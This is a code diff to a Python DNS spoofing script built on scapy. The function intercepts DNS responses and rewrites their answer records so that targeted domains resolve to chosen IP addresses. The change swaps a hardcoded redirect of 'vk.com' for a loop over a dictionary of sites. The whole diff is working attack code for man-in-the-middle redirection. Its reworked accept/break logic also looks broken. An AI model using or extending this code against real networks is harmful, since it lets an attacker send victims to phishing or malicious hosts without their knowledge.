@@ -10,8 +10,8 @@ def spoof_packet(pack):
     if getting_packet.haslayer(scapy.all.DNSRR):
         qname = getting_packet[scapy.all.DNSQR].qname
         for site in sites:
-            if b"vk.com" in qname:
-                dns_response = scapy.all.DNSRR(rrname=qname, rdata=b"157.240.194.35")
+            if site.encode() in qname:
+                dns_response = scapy.all.DNSRR(rrname=qname, rdata=sites[site].encode())
                 getting_packet[scapy.all.DNS].an = dns_response
                 getting_packet[scapy.all.DNS].ancount = 1
                 
@@ -26,8 +26,8 @@ def spoof_packet(pack):
 
                 pack.set_payload(str(getting_packet).encode())
                 print("CHANGING " + site)
-            break    
-        pack.accept()
+            #break    
+            pack.accept()
 
 
 def main():
